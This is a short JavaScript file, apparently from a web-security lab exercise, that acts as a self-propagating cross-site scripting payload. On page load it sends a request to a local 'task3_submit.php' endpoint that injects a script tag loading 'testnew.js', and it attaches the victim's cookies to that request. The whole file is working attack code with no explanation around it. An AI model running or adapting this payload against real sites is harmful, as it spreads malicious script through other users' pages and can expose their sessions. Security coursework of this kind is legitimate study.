window.onload = function(){
    var xhr = new XMLHttpRequest();

    var url = 'http://localhost/task3_submit.php?content=';
    var contenturl = '<script type="text/javascript" src="http://localhost/testnew.js"></script>'
    var endingbit = '&submit=submit';
    
    var fullurl = url + contenturl + endingbit;
    
    xhr.open('GET', fullurl, true);

    xhr.setRequestHeader("Cookie",document.cookie);
    xhr.onload = function() {
	    if (xhr.status===200){
		    console.log(xhr.responseText);
    	}else{
	    	console.log('failed' + xhr.status);
	    }
    };

    xhr.send();

} 